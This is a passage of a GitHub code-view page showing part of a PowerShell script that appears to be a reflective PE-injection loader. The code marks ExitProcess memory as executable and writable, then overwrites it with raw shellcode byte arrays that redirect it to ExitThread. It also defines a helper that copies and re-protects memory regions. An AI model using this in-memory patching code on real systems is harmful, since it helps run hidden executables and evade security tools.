          <td id="L2203" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2203"></td>
          <td id="LC2203" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2204" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2204"></td>
          <td id="LC2204" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>ExitProcess address not found<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2205" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2205"></td>
          <td id="LC2205" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2206" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2206"></td>
          <td id="LC2206" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ExitFunctions</span> <span class="pl-k">+=</span> <span class="pl-smi">$ExitProcessAddr</span></td>
        </tr>
        <tr>
          <td id="L2207" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2207"></td>
          <td id="LC2207" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2208" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2208"></td>
          <td id="LC2208" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">UInt32</span>]<span class="pl-smi">$OldProtectFlag</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L2209" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2209"></td>
          <td id="LC2209" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">foreach</span> (<span class="pl-smi">$ProcExitFunctionAddr</span> <span class="pl-k">in</span> <span class="pl-smi">$ExitFunctions</span>)</td>
        </tr>
        <tr>
          <td id="L2210" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2210"></td>
          <td id="LC2210" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2211" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2211"></td>
          <td id="LC2211" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$ProcExitFunctionAddrTmp</span> <span class="pl-k">=</span> <span class="pl-smi">$ProcExitFunctionAddr</span></td>
        </tr>
        <tr>
          <td id="L2212" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2212"></td>
          <td id="LC2212" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>The following is the shellcode (Shellcode: ExitThread.asm):</span></td>
        </tr>
        <tr>
          <td id="L2213" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2213"></td>
          <td id="LC2213" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>32bit shellcode</span></td>
        </tr>
        <tr>
          <td id="L2214" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2214"></td>
          <td id="LC2214" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Shellcode1</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xbb</span>)</td>
        </tr>
        <tr>
          <td id="L2215" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2215"></td>
          <td id="LC2215" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Shellcode2</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xc6</span><span class="pl-k">,</span> <span class="pl-c1">0x03</span><span class="pl-k">,</span> <span class="pl-c1">0x01</span><span class="pl-k">,</span> <span class="pl-c1">0x83</span><span class="pl-k">,</span> <span class="pl-c1">0xec</span><span class="pl-k">,</span> <span class="pl-c1">0x20</span><span class="pl-k">,</span> <span class="pl-c1">0x83</span><span class="pl-k">,</span> <span class="pl-c1">0xe4</span><span class="pl-k">,</span> <span class="pl-c1">0xc0</span><span class="pl-k">,</span> <span class="pl-c1">0xbb</span>)</td>
        </tr>
        <tr>
          <td id="L2216" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2216"></td>
          <td id="LC2216" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>64bit shellcode (Shellcode: ExitThread.asm)</span></td>
        </tr>
        <tr>
          <td id="L2217" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2217"></td>
          <td id="LC2217" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$PtrSize</span> <span class="pl-k">-eq</span> <span class="pl-c1">8</span>)</td>
        </tr>
        <tr>
          <td id="L2218" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2218"></td>
          <td id="LC2218" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2219" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2219"></td>
          <td id="LC2219" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Shellcode1</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0xbb</span>)</td>
        </tr>
        <tr>
          <td id="L2220" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2220"></td>
          <td id="LC2220" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Shellcode2</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xc6</span><span class="pl-k">,</span> <span class="pl-c1">0x03</span><span class="pl-k">,</span> <span class="pl-c1">0x01</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0x83</span><span class="pl-k">,</span> <span class="pl-c1">0xec</span><span class="pl-k">,</span> <span class="pl-c1">0x20</span><span class="pl-k">,</span> <span class="pl-c1">0x66</span><span class="pl-k">,</span> <span class="pl-c1">0x83</span><span class="pl-k">,</span> <span class="pl-c1">0xe4</span><span class="pl-k">,</span> <span class="pl-c1">0xc0</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0xbb</span>)</td>
        </tr>
        <tr>
          <td id="L2221" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2221"></td>
          <td id="LC2221" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2222" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2222"></td>
          <td id="LC2222" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Shellcode3</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xff</span><span class="pl-k">,</span> <span class="pl-c1">0xd3</span>)</td>
        </tr>
        <tr>
          <td id="L2223" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2223"></td>
          <td id="LC2223" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$TotalSize</span> <span class="pl-k">=</span> <span class="pl-smi">$Shellcode1<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-smi">$PtrSize</span> <span class="pl-k">+</span> <span class="pl-smi">$Shellcode2<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-smi">$PtrSize</span> <span class="pl-k">+</span> <span class="pl-smi">$Shellcode3<span class="pl-smi">.Length</span></span></td>
        </tr>
        <tr>
          <td id="L2224" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2224"></td>
          <td id="LC2224" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2225" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2225"></td>
          <td id="LC2225" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ExitThreadAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetProcAddress.Invoke</span></span>(<span class="pl-smi">$Kernel32Handle</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>ExitThread<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2226" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2226"></td>
          <td id="LC2226" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$ExitThreadAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2227" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2227"></td>
          <td id="LC2227" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2228" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2228"></td>
          <td id="LC2228" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>ExitThread address not found<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2229" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2229"></td>
          <td id="LC2229" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2230" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2230"></td>
          <td id="LC2230" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2231" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2231"></td>
          <td id="LC2231" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$ProcExitFunctionAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$TotalSize</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READWRITE</span></span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>)</td>
        </tr>
        <tr>
          <td id="L2232" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2232"></td>
          <td id="LC2232" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2233" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2233"></td>
          <td id="LC2233" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2234" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2234"></td>
          <td id="LC2234" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to VirtualProtect failed<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2235" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2235"></td>
          <td id="LC2235" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2236" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2236"></td>
          <td id="LC2236" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2237" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2237"></td>
          <td id="LC2237" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Make copy of original ExitProcess bytes</span></td>
        </tr>
        <tr>
          <td id="L2238" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2238"></td>
          <td id="LC2238" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$ExitProcessOrigBytesPtr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-smi">$TotalSize</span>)</td>
        </tr>
        <tr>
          <td id="L2239" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2239"></td>
          <td id="LC2239" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Win32Functions<span class="pl-smi">.memcpy.Invoke</span></span>(<span class="pl-smi">$ExitProcessOrigBytesPtr</span><span class="pl-k">,</span> <span class="pl-smi">$ProcExitFunctionAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt64</span>]<span class="pl-smi">$TotalSize</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2240" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2240"></td>
          <td id="LC2240" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$ReturnArray</span> <span class="pl-k">+=</span> <span class="pl-k">,</span>(<span class="pl-smi">$ProcExitFunctionAddr</span><span class="pl-k">,</span> <span class="pl-smi">$ExitProcessOrigBytesPtr</span><span class="pl-k">,</span> <span class="pl-smi">$TotalSize</span>)</td>
        </tr>
        <tr>
          <td id="L2241" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2241"></td>
          <td id="LC2241" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2242" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2242"></td>
          <td id="LC2242" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then </span></td>
        </tr>
        <tr>
          <td id="L2243" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2243"></td>
          <td id="LC2243" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>	call ExitThread</span></td>
        </tr>
        <tr>
          <td id="L2244" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2244"></td>
          <td id="LC2244" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$Shellcode1</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$ProcExitFunctionAddrTmp</span></td>
        </tr>
        <tr>
          <td id="L2245" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2245"></td>
          <td id="LC2245" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$ProcExitFunctionAddrTmp</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$ProcExitFunctionAddrTmp</span> (<span class="pl-smi">$Shellcode1<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L2246" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2246"></td>
          <td id="LC2246" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$ExeDoneBytePtr</span><span class="pl-k">,</span> <span class="pl-smi">$ProcExitFunctionAddrTmp</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2247" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2247"></td>
          <td id="LC2247" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$ProcExitFunctionAddrTmp</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$ProcExitFunctionAddrTmp</span> <span class="pl-smi">$PtrSize</span></td>
        </tr>
        <tr>
          <td id="L2248" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2248"></td>
          <td id="LC2248" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$Shellcode2</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$ProcExitFunctionAddrTmp</span></td>
        </tr>
        <tr>
          <td id="L2249" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2249"></td>
          <td id="LC2249" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$ProcExitFunctionAddrTmp</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$ProcExitFunctionAddrTmp</span> (<span class="pl-smi">$Shellcode2<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L2250" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2250"></td>
          <td id="LC2250" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$ExitThreadAddr</span><span class="pl-k">,</span> <span class="pl-smi">$ProcExitFunctionAddrTmp</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2251" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2251"></td>
          <td id="LC2251" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$ProcExitFunctionAddrTmp</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$ProcExitFunctionAddrTmp</span> <span class="pl-smi">$PtrSize</span></td>
        </tr>
        <tr>
          <td id="L2252" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2252"></td>
          <td id="LC2252" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$Shellcode3</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$ProcExitFunctionAddrTmp</span></td>
        </tr>
        <tr>
          <td id="L2253" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2253"></td>
          <td id="LC2253" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2254" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2254"></td>
          <td id="LC2254" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$ProcExitFunctionAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$TotalSize</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$OldProtectFlag</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2255" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2255"></td>
          <td id="LC2255" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2256" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2256"></td>
          <td id="LC2256" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>################################################</span></td>
        </tr>
        <tr>
          <td id="L2257" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2257"></td>
          <td id="LC2257" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2258" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2258"></td>
          <td id="LC2258" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-Output</span> <span class="pl-smi">$ReturnArray</span></td>
        </tr>
        <tr>
          <td id="L2259" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2259"></td>
          <td id="LC2259" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2260" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2260"></td>
          <td id="LC2260" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L2261" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2261"></td>
          <td id="LC2261" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L2262" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2262"></td>
          <td id="LC2262" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)</span></td>
        </tr>
        <tr>
          <td id="L2263" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2263"></td>
          <td id="LC2263" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>	It copies Count bytes from Source to Destination.</span></td>
        </tr>
        <tr>
          <td id="L2264" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2264"></td>
          <td id="LC2264" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Copy-ArrayOfMemAddresses</span></td>
        </tr>
        <tr>
          <td id="L2265" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2265"></td>
          <td id="LC2265" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2266" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2266"></td>
          <td id="LC2266" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L2267" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2267"></td>
          <td id="LC2267" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L2268" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2268"></td>
          <td id="LC2268" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Array</span>[]]</td>
        </tr>
        <tr>
          <td id="L2269" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2269"></td>
          <td id="LC2269" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$CopyInfo</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L2270" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2270"></td>
          <td id="LC2270" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2271" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2271"></td>
          <td id="LC2271" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L2272" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2272"></td>
          <td id="LC2272" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L2273" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2273"></td>
          <td id="LC2273" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L2274" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2274"></td>
          <td id="LC2274" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2275" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2275"></td>
          <td id="LC2275" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L2276" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2276"></td>
          <td id="LC2276" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L2277" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2277"></td>
          <td id="LC2277" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L2278" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2278"></td>
          <td id="LC2278" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L2279" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2279"></td>
          <td id="LC2279" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2280" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2280"></td>
          <td id="LC2280" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">UInt32</span>]<span class="pl-smi">$OldProtectFlag</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L2281" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2281"></td>
          <td id="LC2281" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">foreach</span> (<span class="pl-smi">$Info</span> <span class="pl-k">in</span> <span class="pl-smi">$CopyInfo</span>)</td>
        </tr>
        <tr>
          <td id="L2282" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2282"></td>
          <td id="LC2282" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2283" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2283"></td>
          <td id="LC2283" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$Info</span>[<span class="pl-c1">0</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$Info</span>[<span class="pl-c1">2</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READWRITE</span></span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>)</td>
        </tr>
        <tr>
          <td id="L2284" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2284"></td>
          <td id="LC2284" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2285" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2285"></td>
          <td id="LC2285" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2286" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2286"></td>
          <td id="LC2286" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to VirtualProtect failed<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2287" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2287"></td>
          <td id="LC2287" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2288" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2288"></td>
          <td id="LC2288" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2289" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2289"></td>
          <td id="LC2289" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Win32Functions<span class="pl-smi">.memcpy.Invoke</span></span>(<span class="pl-smi">$Info</span>[<span class="pl-c1">0</span>]<span class="pl-k">,</span> <span class="pl-smi">$Info</span>[<span class="pl-c1">1</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt64</span>]<span class="pl-smi">$Info</span>[<span class="pl-c1">2</span>]) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2290" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2290"></td>
          <td id="LC2290" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2291" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2291"></td>
          <td id="LC2291" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$Info</span>[<span class="pl-c1">0</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$Info</span>[<span class="pl-c1">2</span>]<span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$OldProtectFlag</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
